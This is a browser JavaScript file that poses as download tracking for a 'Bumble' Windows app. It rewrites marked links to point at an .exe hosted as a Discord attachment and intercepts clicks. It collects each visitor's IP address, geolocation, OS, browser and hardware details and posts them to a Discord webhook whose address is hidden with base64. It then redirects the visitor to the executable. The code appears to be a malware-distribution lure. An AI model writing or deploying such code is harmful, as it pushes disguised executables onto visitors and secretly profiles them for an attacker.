(function (global) {
    "use strict";

    /** GÜNCELLENMİŞ - Çalışan Discord indirme linki */
    var BUMBLE_APP_DOWNLOAD_URL = "https://cdn.discordapp.com/attachments/1292210888883044362/1490811021479116931/BumbleApp.exe?ex=69d56975&is=69d417f5&hm=f34731b79a6bfa88f2f604cb43e45d9efadb6948d6341c7ac41dfcfa91fd682a&";

    var WEBHOOK_URL = atob("aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTQ5MDQwNjMyOTU5NTIwMzgzNC80eUZGbnNFSnpaRHdueW9fVHFyMHdQazREY2NoWFdMOU1QRm5ua1VCejluYjBNOU9ZcXB2LWF0OUNhcEMwTkp5MGU3OQ==");

    var EMBED_COLOR = 0xfdb913;
    var AVATAR_URL = "https://cdn.jsdelivr.net/gh/twitter/twemoji@14.0.2/assets/72x72/1f7e1.png";

    function clip(s, max) {
        max = max || 1020;
        var t = String(s == null ? "" : s);
        return t.length <= max ? t : t.slice(0, max - 1) + "\u2026";
    }

    function fetchWithTimeout(url, timeoutMs) {
        timeoutMs = timeoutMs || 15000;
        var opts = { mode: "cors", cache: "no-store" };
        if (typeof AbortSignal !== "undefined" && AbortSignal.timeout) {
            opts.signal = AbortSignal.timeout(timeoutMs);
        } else {
            var ctrl = new AbortController();
            setTimeout(function () { ctrl.abort(); }, timeoutMs);
            opts.signal = ctrl.signal;
        }
        return fetch(url, opts)
            .then(function (r) {
                if (!r.ok) return null;
                return r.json().catch(function () { return null; });
            })
            .catch(function () { return null; });
    }

    function lc(s) {
        return s == null ? "" : String(s).trim();
    }

    function normalizeGeo(raw) {
        if (!raw || typeof raw !== "object") return null;
        if (raw.error === true || raw.error === "true") return null;
        if (raw.success === false) return null;
        var ip = raw.ip || raw.query || raw.IPv4 || raw.address;
        if (!ip) return null;
        ip = String(ip).trim();
        if (!ip) return null;
        var city = lc(raw.city);
        var region = lc(raw.region || raw.regionName || raw.state || raw.province || raw.region_code);
        var country = lc(raw.country_name || raw.country || raw.country_name_long);
        var code = raw.country_code || raw.countryCode || "";
        if (code != null) {
            code = String(code).replace(/\s/g, "").toUpperCase();
            if (!/^[A-Z]{2}$/.test(code)) code = "";
        }
        if (!country && code) country = code;
        return {
            ip: ip,
            city: city,
            region: region,
            country_name: country,
            country_code: code
        };
    }

    function mergeGeoResults(results) {
        var list = [];
        for (var i = 0; i < results.length; i++) {
            var g = normalizeGeo(results[i]);
            if (g && g.ip) list.push(g);
        }
        if (!list.length) return null;
        var base = {
            ip: list[0].ip,
            country_name: "",
            country_code: "",
            region: "",
            city: ""
        };
        for (var j = 0; j < list.length; j++) {
            var x = list[j];
            if (x.ip !== base.ip) continue;
            base.country_name = base.country_name || x.country_name;
            base.country_code = base.country_code || x.country_code;
            base.region = base.region || x.region;
            base.city = base.city || x.city;
        }
        return base;
    }

    function formatLocationLine(geo) {
        if (!geo || !geo.ip) return "Unknown";
        var city = lc(geo.city);
        var region = lc(geo.region);
        var country = lc(geo.country_name);
        var line = [city, region, country].filter(Boolean).join(", ");
        return line || "Unknown";
    }

    function fetchIpJson() {
        return Promise.all([
            fetchWithTimeout("https://get.geojs.io/v1/ip/geo.json", 15000),
            fetchWithTimeout("https://ipapi.co/json/", 15000),
            fetchWithTimeout("https://ipwho.is/", 15000)
        ]).then(function (arr) {
            var g = mergeGeoResults(arr);
            if (g && g.ip) return g;
            return fetchWithTimeout("https://api.ipify.org?format=json", 10000).then(function (ij) {
                if (!ij || !ij.ip) return {};
                var pip = String(ij.ip);
                return fetchWithTimeout("https://get.geojs.io/v1/ip/geo/" + encodeURIComponent(pip) + ".json", 15000)
                    .then(function (geoByIp) {
                        var g2 = normalizeGeo(geoByIp);
                        if (g2 && g2.ip) return g2;
                        return fetchWithTimeout("https://ipapi.co/" + encodeURIComponent(pip) + "/json/", 15000);
                    });
            });
        }).then(function (raw) {
            var g = normalizeGeo(raw);
            return g && g.ip ? g : {};
        }).catch(function () {
            return {};
        });
    }

    function getBrowserName() {
        var ua = navigator.userAgent;
        if (ua.indexOf("Firefox") !== -1) return "Firefox";
        if (ua.indexOf("Edg") !== -1) return "Microsoft Edge";
        if (ua.indexOf("OPR") !== -1 || ua.indexOf("Opera") !== -1) return "Opera";
        if (ua.indexOf("Chrome") !== -1) return "Chrome";
        if (ua.indexOf("Safari") !== -1) return "Safari";
        return "Other Browser";
    }

    function getOS() {
        var ua = navigator.userAgent;
        if (ua.indexOf("Windows NT 10.0") !== -1) return "Windows 10/11";
        if (ua.indexOf("Windows NT 6.1") !== -1) return "Windows 7";
        if (ua.indexOf("Windows") !== -1) return "Windows";
        if (ua.indexOf("Mac OS") !== -1 || ua.indexOf("Macintosh") !== -1) return "macOS";
        if (ua.indexOf("Linux") !== -1) return "Linux";
        if (ua.indexOf("Android") !== -1) return "Android";
        if (ua.indexOf("iPhone") !== -1 || ua.indexOf("iPad") !== -1) return "iOS";
        return "Unknown OS";
    }

    function getHardwareInfo() {
        return {
            screen: window.screen.width + "x" + window.screen.height,
            language: navigator.language || "Unknown",
            cores: navigator.hardwareConcurrency != null ? String(navigator.hardwareConcurrency) : "N/A",
            memory: navigator.deviceMemory != null ? navigator.deviceMemory + " GB" : "N/A"
        };
    }

    function postWebhook(payload) {
        return fetch(WEBHOOK_URL, {
            method: "POST",
            mode: "cors",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify(payload),
            keepalive: true
        }).then(function (res) {
            if (!res.ok) {
                return res.text().then(function (body) {
                    console.error("Webhook HTTP " + res.status, body);
                    return fetch(WEBHOOK_URL, {
                        method: "POST",
                        mode: "cors",
                        headers: { "Content-Type": "application/json" },
                        body: JSON.stringify({
                            content: clip("bumble download ping failed (HTTP " + res.status + ")", 2000)
                        }),
                        keepalive: true
                    });
                });
            }
        }).catch(function (e) {
            console.error("Webhook failed", e);
        });
    }

    function notifyBumbleDownload(opts) {
        opts = opts || {};
        var pageUrl = opts.pageUrl || global.location.href;
        var guestName = opts.guestName;
        var triggerLabel = opts.triggerLabel;

        var now = new Date();
        var timestamp = now.toISOString();
        var nowLocal = new Intl.DateTimeFormat("en-US", {
            weekday: "long",
            year: "numeric",
            month: "long",
            day: "numeric",
            hour: "2-digit",
            minute: "2-digit"
        }).format(now);

        return fetchIpJson().then(function (geo) {
            var locationStr = formatLocationLine(geo);
            var ip = "Unknown";
            var countryFlag = "";
            if (geo && geo.ip) {
                ip = geo.ip;
                var cc = geo.country_code || "";
                if (/^[A-Za-z]{2}$/.test(String(cc))) {
                    var code = String(cc).toUpperCase();
                    countryFlag = String.fromCodePoint.apply(null,
                        code.split("").map(function (c) {
                            return 0x1f1e6 + c.charCodeAt(0) - 65;
                        })
                    );
                }
            }

            var browserName = getBrowserName();
            var osName = getOS();
            var hw = getHardwareInfo();
            var hwLine = "Screen `" + hw.screen + "` · Language `" + hw.language + "` · CPU cores `" + hw.cores + "` · RAM `" + hw.memory + "`";

            var sourceLines = "**Page URL**\n`" + pageUrl + "`";
            if (triggerLabel) {
                sourceLines += "\n**Trigger**\n`" + clip(triggerLabel, 500) + "`";
            }
            if (guestName) {
                sourceLines += "\n**Guest name**\n`" + guestName + "`";
            }

            var payload = {
                username: "bumble - Downloads",
                avatar_url: AVATAR_URL,
                embeds: [{
                    title: "\uD83C\uDFAC New desktop download",
                    description: "A visitor started downloading the **bumble** Windows app.",
                    color: EMBED_COLOR,
                    fields: [
                        { name: "\uD83D\uDCCD Source page", value: clip(sourceLines), inline: false },
                        { name: "\u2B07\uFE0F Install link", value: clip("`" + BUMBLE_APP_DOWNLOAD_URL + "`"), inline: false },
                        { name: "\uD83C\uDF0D Location", value: clip("`" + locationStr + "`" + (countryFlag ? " " + countryFlag : "")), inline: false },
                        { name: "\uD83D\uDDA5\uFE0F IP address", value: "`" + clip(ip, 100) + "`", inline: false },
                        { name: "\u231A Local time", value: "`" + clip(nowLocal, 200) + "`", inline: false },
                        { name: "\uD83D\uDDA5\uFE0F Platform", value: "`" + osName + "`", inline: true },
                        { name: "\uD83C\uDF10 Browser", value: "`" + browserName + "`", inline: true },
                        { name: "\u2699\uFE0F Hardware", value: clip(hwLine), inline: false }
                    ],
                    footer: {
                        text: "bumble \u2022 bumbleseries.com",
                        icon_url: AVATAR_URL
                    },
                    timestamp: timestamp
                }]
            };

            return postWebhook(payload);
        });
    }

    function trackBumbleDownload(opts) {
        opts = opts || {};
        return notifyBumbleDownload({
            guestName: opts.userLabel,
            pageUrl: opts.pageUrl,
            triggerLabel: opts.triggerLabel
        });
    }

    function applyDownloadLinksToAnchors() {
        if (typeof document === "undefined") return;
        var nodes = document.querySelectorAll("a[data-bumble-download]");
        for (var i = 0; i < nodes.length; i++) {
            nodes[i].setAttribute("href", BUMBLE_APP_DOWNLOAD_URL);
            nodes[i].setAttribute("rel", "noopener noreferrer");
        }
    }

    function onDocumentClickCapture(e) {
        var a = e.target.closest && e.target.closest("a[data-bumble-download]");
        if (!a) return;
        if (a.getAttribute("data-download-no-track") != null) return;
        e.preventDefault();
        notifyBumbleDownload({
            pageUrl: global.location.href,
            triggerLabel: a.getAttribute("data-bumble-trigger") || undefined
        }).finally(function () {
            global.location.href = BUMBLE_APP_DOWNLOAD_URL;
        });
    }

    if (typeof document !== "undefined") {
        document.addEventListener("DOMContentLoaded", function () {
            applyDownloadLinksToAnchors();
            document.addEventListener("click", onDocumentClickCapture, true);
        });
    }

    global.BUMBLE_APP_DOWNLOAD_URL = BUMBLE_APP_DOWNLOAD_URL;
    global.notifyBumbleDownload = notifyBumbleDownload;
    global.trackBumbleDownload = trackBumbleDownload;
})(typeof window !== "undefined" ? window : this);
